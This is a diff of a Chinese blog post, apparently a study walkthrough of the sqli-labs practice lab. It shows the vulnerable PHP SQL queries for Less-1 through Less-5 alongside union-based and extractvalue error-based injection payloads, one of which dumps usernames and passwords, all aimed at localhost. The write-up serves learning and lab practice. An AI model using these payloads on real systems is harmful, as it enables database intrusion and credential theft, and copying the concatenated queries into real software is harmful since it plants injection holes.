@@ -7,12 +7,12 @@
   
   <title>sqli-labs专题持续更新 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一、error_based显错注入-联合查询:知识点 1.判断注入点：以第一种为例id&#x3D;1’ 在1后面加上单引号，页面出错；id&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误 2.判断字段数：通过order by的回显 &#x2F;&#x2F;order by 1–+ 3.判断回显点：union select 1,2,3–+ 4.查询相关内容：***UNION 内部的 SELECT 语句必须拥有相同">
+  <meta name="description" content="一、error_based(回显)显错注入-联合查询:知识点 1.判断注入点：以第一种为例id&#x3D;1’ 在1后面加上单引号，页面出错；id&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误 2.判断字段数：通过order by的回显 &#x2F;&#x2F;order by 1–+ 3.判断回显点：union select 1,2,3–+ 4.查询相关内容：***UNION 内部的 SELECT 语句必须">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs专题持续更新">
 <meta property="og:url" content="https://zmh2000829.github.io/2020/09/27/ctf-web7/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一、error_based显错注入-联合查询:知识点 1.判断注入点：以第一种为例id&#x3D;1’ 在1后面加上单引号，页面出错；id&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误 2.判断字段数：通过order by的回显 &#x2F;&#x2F;order by 1–+ 3.判断回显点：union select 1,2,3–+ 4.查询相关内容：***UNION 内部的 SELECT 语句必须拥有相同">
+<meta property="og:description" content="一、error_based(回显)显错注入-联合查询:知识点 1.判断注入点：以第一种为例id&#x3D;1’ 在1后面加上单引号，页面出错；id&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误 2.判断字段数：通过order by的回显 &#x2F;&#x2F;order by 1–+ 3.判断回显点：union select 1,2,3–+ 4.查询相关内容：***UNION 内部的 SELECT 语句必须">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://zmh2000829.github.io/2020/09/27/ctf-web7/1.png">
 <meta property="og:image" content="https://zmh2000829.github.io/2020/09/27/ctf-web7/2.png">
@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://zmh2000829.github.io/2020/09/27/ctf-web7/8.png">
 <meta property="og:image" content="https://zmh2000829.github.io/2020/09/27/ctf-web7/9.png">
 <meta property="article:published_time" content="2020-09-27T06:16:57.000Z">
-<meta property="article:modified_time" content="2020-09-27T11:18:06.009Z">
+<meta property="article:modified_time" content="2020-09-27T16:40:34.976Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://zmh2000829.github.io/2020/09/27/ctf-web7/1.png">
@@ -102,7 +102,7 @@
         <hr>
 <div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/1.png" class></div>
 
-<h3 id="一、error-based"><a href="#一、error-based" class="headerlink" title="一、error_based"></a>一、error_based</h3><p>显错注入-联合查询:知识点</p>
+<h3 id="一、error-based-回显"><a href="#一、error-based-回显" class="headerlink" title="一、error_based(回显)"></a>一、error_based(回显)</h3><p>显错注入-联合查询:知识点</p>
 <p>1.判断注入点：以第一种为例id=1’ 在1后面加上单引号，页面出错；id=1 and 1=1 正常 id=1 and 1=2 错误</p>
 <p>2.判断字段数：通过order by的回显 //order by 1–+</p>
 <p>3.判断回显点：union select 1,2,3–+</p>
@@ -113,7 +113,9 @@
 <p>and 1=2 union select 1,column_name from information_schema.columns where table_schema=’库名’ and table_name=’表名’ limit 0,1</p>
 <p>​    d.查询字段内容<br>and 1=2 union select 1,name from ‘表名’</p>
 <hr>
-<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><h5 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h5><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> 报错找到注入点</p>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h5><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> 报错找到注入点</p>
 <p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+ 确定位数</p>
 <p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,database()–+ 确定当前数据库名字</p>
 <div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/2.png" class></div>
@@ -143,7 +145,28 @@
 <div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/9.png" class></div>
 
 <hr>
-<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>指令同less-1，只是将为了闭合语句的 ‘  去掉即可！</p>
+<hr>
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>指令同less-1，只是将为了闭合语句的 ‘  替换为  ’)  即可！</p>
+<hr>
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>指令同less-1，只是将为了闭合语句的 ‘  替换为  )  即可！</p>
+<hr>
+<h3 id="二、double-based-报错"><a href="#二、double-based-报错" class="headerlink" title="二、double based(报错)"></a>二、double based(报错)</h3><p>原理：构造的payload可以成功执行select   id=’and(select extractvalue(“anything”,concat(0x7e,(select语句)))) </p>
+<p>爆表名：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) </p>
+<p>爆字段名：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”TABLE_NAME”)))) </p>
+<p>爆数据：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from TABLE_NAME))))</p>
+<p>注明：这里0x7e代表  ~  可以换成’#’、’$’等不满足xpath格式的字符，extractvalue只能显示</p>
+<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysqli_query($con1, $sql);</span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;   <span class="comment">//here is different from the last one</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">        print_r(mysqli_error($con1));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://localhost/sqli-labs/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/?id=1&#39;</a> and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where<br>  table_schema=database() and table_name=”users”))))–+ </p>
+<p><a href="http://localhost/sqli-labs/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/?id=1&#39;</a> and(select extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))))–+ </p>
+
       
     </div>
     <footer class="article-footer">
@@ -155,6 +178,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2020/10/04/ctf-web8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          XXE漏洞介绍
+        
+      </div>
+    </a>
   
   
     <a href="/2020/09/23/ctf-web6/" id="article-nav-older" class="article-nav-link-wrap">
@@ -183,7 +215,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
     </div>
   </div>
 
@@ -196,6 +228,14 @@
       <ul>
         
           <li>
+            <a href="/2020/10/17/ctf-web9/">ctf-web9</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/04/ctf-web8/">XXE漏洞介绍</a>
+          </li>
+        
+          <li>
             <a href="/2020/09/27/ctf-web7/">sqli-labs专题持续更新</a>
           </li>
         
@@ -205,14 +245,6 @@
         
           <li>
             <a href="/2020/08/26/ctf-web5/">ctf-web5</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/26/ctf-web4/">ctf-web4</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/05/ctf-web3/">ctf-web3</a>
           </li>
         
       </ul>
